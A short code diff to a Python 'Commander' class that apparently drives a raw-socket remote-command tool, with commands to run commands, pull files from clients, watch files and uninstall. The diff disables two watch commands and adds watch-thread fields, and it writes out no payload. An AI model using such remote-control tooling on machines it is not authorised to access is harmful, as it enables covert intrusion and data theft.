@@ -37,8 +37,8 @@ class CommandType(IntEnum):
 COMMANDS_WITH_RESPONSE = frozenset([
     CommandType.RUN_COMMAND,
     CommandType.TRANSFER_FROM_CLIENT,
-    CommandType.FILE_WATCH,
-    CommandType.STOP_WATCH,
+    # CommandType.FILE_WATCH,
+    # CommandType.STOP_WATCH,
     CommandType.UNINSTALL,
 ])
 
@@ -60,6 +60,8 @@ class Commander:
         self.source_ip = self.get_local_ip()
         self.protocol = RawSocketProtocol()
         self._pending_get_filename = None  # filename expected from next TRANSFER_FROM_CLIENT response
+        self._watch_thread = None
+        self._watch_stop = threading.Event()
         os.makedirs(RECEIVED_DIR, exist_ok=True)
 
     def get_local_ip(self):
